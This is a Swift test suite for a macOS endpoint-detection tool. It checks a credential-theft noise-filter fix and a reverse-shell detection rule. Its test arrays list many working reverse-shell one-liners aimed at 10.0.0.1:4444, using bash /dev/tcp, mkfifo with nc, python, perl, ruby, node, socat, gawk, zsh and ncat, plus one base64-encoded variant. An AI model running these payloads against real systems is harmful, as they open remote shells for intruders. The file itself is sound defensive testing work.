// Phase1DetectionGapTests.swift
// v1.21.5-rc.3 — locks the two HIGH detection gaps from the mother-of-all-audits:
//
//  (0) NoiseFilter Gate 3 (trusted browser / Electron helper) silently dropped
//      credential-theft matches BEFORE the Gate-8 AMOS/Banshee carve-out could
//      save them. A compromised VS Code / Cursor / Slack helper reading a
//      FOREIGN credential store (~/.ssh, a keychain, another browser's profile)
//      was suppressed. Fix: Gate 3 now exempts credential-theft matches unless
//      the access is the browser reading its OWN profile.
//
//  (1) reverse_shell_pattern.yml (stable/critical) was a brittle literal match
//      trivially evaded by /dev/tcp spacing/FD variants, mkfifo+nc, reordered
//      python imports, and pty.spawn. Fix: generic /dev/tcp + /dev/udp catch
//      plus |all multi-token selections — while benign command lines stay clean.

import Testing
import Foundation
@testable import MacCrabCore

@Suite("Phase 1 (0): NoiseFilter Gate 3 credential-theft carve-out")
struct NoiseFilterGate3CredentialTests {

    private func credMatch(technique: String, suppressible: Bool = true,
                           severity: Severity = .high) -> RuleMatch {
        RuleMatch(ruleId: "cred", ruleName: "credential read", severity: severity,
                  description: "", mitreTechniques: [technique], tags: [],
                  suppressible: suppressible)
    }

    /// A file OPEN (read) event whose SUBJECT is a trusted browser/Electron
    /// helper and whose TARGET is `filePath`.
    private func helperReads(_ exec: String, _ filePath: String) -> Event {
        let p = MacCrabCore.ProcessInfo(
            pid: 100, ppid: 1, rpid: 1, name: (exec as NSString).lastPathComponent,
            executable: exec, commandLine: exec, args: [exec], workingDirectory: "/tmp",
            userId: 501, userName: "t", groupId: 20, startTime: Date(), codeSignature: nil,
            ancestors: [], architecture: "arm64", isPlatformBinary: false)
        let f = FileInfo(path: filePath, action: .open)
        return Event(eventCategory: .file, eventType: .creation, eventAction: "open",
                     process: p, file: f)
    }

    private let vscodeHelper =
        "/Applications/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper"
    private let chrome =
        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

    @Test("a VS Code helper reading a FOREIGN credential store keeps its credential-theft match")
    func foreignCredentialReadSurvives() {
        // The GlassWorm / malicious-extension scenario: an Electron helper reads
        // ~/.ssh/id_rsa. Gate 3 must NOT suppress this.
        var m = [credMatch(technique: "attack.t1552.004")]  // Unsecured Credentials — private key
        NoiseFilter.apply(&m, event: helperReads(vscodeHelper, "\(NSHomeDirectory())/.ssh/id_rsa"),
                          isWarmingUp: false)
        #expect(m.count == 1, "a trusted helper reading a FOREIGN credential store must survive Gate 3")
    }

    @Test("a browser reading its OWN profile store stays suppressed (no FP re-noise)")
    func ownProfileReadSuppressed() {
        // Chrome reading its own Login Data is expected first-party behaviour —
        // still noise, must stay dropped so the fix does not flood the analyst.
        let ownStore = "\(NSHomeDirectory())/Library/Application Support/Google/Chrome/Default/Login Data"
        var m = [credMatch(technique: "attack.t1555.003")]  // Credentials from Web Browsers
        NoiseFilter.apply(&m, event: helperReads(chrome, ownStore), isWarmingUp: false)
        #expect(m.isEmpty, "a browser reading its OWN profile is suppressed by Gate 3 (own-profile carve-out)")
    }

    @Test("Chrome reading ANOTHER browser's profile is foreign — survives")
    func crossBrowserProfileReadSurvives() {
        let firefoxStore = "\(NSHomeDirectory())/Library/Application Support/Firefox/Profiles/x/logins.json"
        var m = [credMatch(technique: "attack.t1555.003")]
        NoiseFilter.apply(&m, event: helperReads(chrome, firefoxStore), isWarmingUp: false)
        #expect(m.count == 1, "Chrome reading Firefox's store is a FOREIGN read — must survive Gate 3")
    }

    @Test("a NON-credential suppressible match on the same foreign read is still dropped by Gate 3")
    func nonCredentialStillDropped() {
        var m = [credMatch(technique: "attack.t1083", severity: .high)]  // File & Directory Discovery
        NoiseFilter.apply(&m, event: helperReads(vscodeHelper, "\(NSHomeDirectory())/.ssh/id_rsa"),
                          isWarmingUp: false)
        #expect(m.isEmpty, "a non-credential-theft suppressible match is still Gate-3 noise")
    }
}

@Suite("Phase 1 (1): reverse_shell_pattern obfuscation coverage")
struct ReverseShellRuleCoverageTests {

    private let reverseShellRuleId = "d1a2b3c4-0042-4000-a000-000000000042"

    private func execEvent(_ cmd: String) -> Event {
        let p = MacCrabCore.ProcessInfo(
            pid: 200, ppid: 1, rpid: 1, name: "sh", executable: "/bin/sh",
            commandLine: cmd, args: cmd.split(separator: " ").map(String.init),
            workingDirectory: "/tmp", userId: 501, userName: "t", groupId: 20,
            startTime: Date(), codeSignature: nil, ancestors: [],
            architecture: "arm64", isPlatformBinary: true)
        return Event(eventCategory: .process, eventType: .start, eventAction: "exec", process: p)
    }

    private func engineLoaded() async throws -> RuleEngine {
        ensureRulesCompiled()
        let engine = RuleEngine()
        _ = try await engine.loadRules(from: URL(fileURLWithPath: "/tmp/maccrab_v3"))
        return engine
    }

    private func fires(_ engine: RuleEngine, _ cmd: String) async -> Bool {
        await engine.evaluate(execEvent(cmd)).contains { $0.ruleId == reverseShellRuleId }
    }

    @Test("obfuscated reverse-shell variants that evaded the old literals now fire")
    func obfuscatedVariantsFire() async throws {
        let engine = try await engineLoaded()
        let payloads: [String] = [
            "bash -i >&/dev/tcp/10.0.0.1/4444 0>&1",            // no space after >&
            "bash -i  >& /dev/tcp/10.0.0.1/4444 0>&1",           // double space
            "sh -i >& /dev/tcp/10.0.0.1/4444 0>&1",              // bare sh
            "exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | sh",      // FD redirect form
            "bash -c 'exec 3<>/dev/udp/10.0.0.1/53'",            // udp variant
            "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",  // named pipe
            "python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444));subprocess.call([\"/bin/sh\"])'",  // reordered imports
            "python3 -c 'import pty;pty.spawn(\"/bin/sh\")'",    // pty upgrade
        ]
        for cmd in payloads {
            let hit = await fires(engine, cmd)
            #expect(hit, "reverse-shell rule should fire on: \(cmd)")
        }
    }

    @Test("benign command lines that merely contain a token do NOT fire (|all groups are ANDed)")
    func benignControlsDoNotFire() async throws {
        let engine = try await engineLoaded()
        let benign: [String] = [
            "/bin/ls -la /tmp",                                  // just /bin/ — must not fire
            "node -e \"require('socket.io')\"",                  // 'socket' alone
            "python3 -m subprocess",                             // 'subprocess' alone
            "nc -z -w1 example.com 443",                         // nc port check, no -e/-c, no mkfifo
            "mkfifo /tmp/mypipe",                                // mkfifo alone, no nc
            "ssh -L 8080:localhost:80 host",                     // 'connect'-free tunnel
            // The python_socket |all FP the P1 adversarial verify found: socket +
            // subprocess + connect + a NON-shell /bin binary. Now requires /bin/sh
            // or /bin/bash, so this benign CI wait-for-port one-liner is clean.
            "python3 -c \"import socket,subprocess; socket.create_connection(('127.0.0.1',5432)); subprocess.run(['/bin/echo','up'])\"",
            "grep -e /bin/sh /etc/shells",                       // grep -e, not ncat -e
            "socat TCP-LISTEN:8080,fork TCP:localhost:80",       // socat port-forward, no EXEC:
            "node -e \"require('child_process').execSync('/bin/ls')\"", // child_process, no network leg
            // rc.3-verify FP: mkfifo + rsync (rsync CONTAINS 'nc ') + bash (contains
            // 'sh') — must NOT fire now that the named-pipe group requires /bin/sh.
            "bash -c \"mkfifo /tmp/f; tar cf - /data > /tmp/f & rsync -a /tmp/f host:/bak\"",
            "bash -c \"mkfifo /tmp/pipe && sync && ls\"",        // mkfifo + 'sync'(nc ) + bash, no /bin/sh
        ]
        for cmd in benign {
            let hit = await fires(engine, cmd)
            #expect(!hit, "reverse-shell rule must NOT fire on benign: \(cmd)")
        }
    }

    @Test("expanded interpreter/tool coverage from the P1 adversarial verify all fires")
    func expandedCoverageFires() async throws {
        let engine = try await engineLoaded()
        let payloads: [String] = [
            "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\")));exec(\"/bin/sh -i\");'",  // perl
            "socat TCP:10.0.0.1:4444 EXEC:/bin/sh",              // socat EXEC
            "gawk 'BEGIN{s=\"/inet/tcp/0/10.0.0.1/4444\";system(\"/bin/sh\")}'",  // gawk /inet/tcp
            "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444);exec sprintf(\"/bin/sh -i <&%d\",f.fileno)'",  // ruby TCPSocket
            "node -e 'require(\"net\").connect(4444,\"10.0.0.1\",function(){require(\"child_process\").spawn(\"/bin/sh\",[])})'",  // node
            "zsh -c 'zmodload zsh/net/tcp && ztcp 10.0.0.1 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",  // zsh ztcp
            "ncat --ssl 10.0.0.1 4444 -e /bin/sh",              // ncat with flags before -e
            "D=/dev/tcp;bash -i >& $D/10.0.0.1/4444 0>&1",      // /dev/tcp variable-split
            "sh -c 'mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f'",  // mkfifo named-pipe
            "mknod /tmp/bp p; /bin/sh 0</tmp/bp | nc 10.0.0.1 4444 1>/tmp/bp",            // mknod named-pipe
        ]
        for cmd in payloads {
            let hit = await fires(engine, cmd)
            #expect(hit, "reverse-shell rule should fire on: \(cmd)")
        }
    }

    @Test("documented behavioral-layer misses do NOT fire (honest boundary, not a regression)")
    func documentedMissesDoNotFire() async throws {
        let engine = try await engineLoaded()
        // These carry no reverse-shell tokens in the process_creation command line
        // (payload is base64-encoded / lives in a file); a command-line rule
        // genuinely cannot see them. Asserted so the boundary is explicit.
        let misses: [String] = [
            "bash -c \"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 --decode | bash\"",
            "bash /tmp/.cache/update.sh",
        ]
        for cmd in misses {
            let hit = await fires(engine, cmd)
            #expect(!hit, "expected a command-line MISS (behavioral-layer territory): \(cmd)")
        }
    }
}
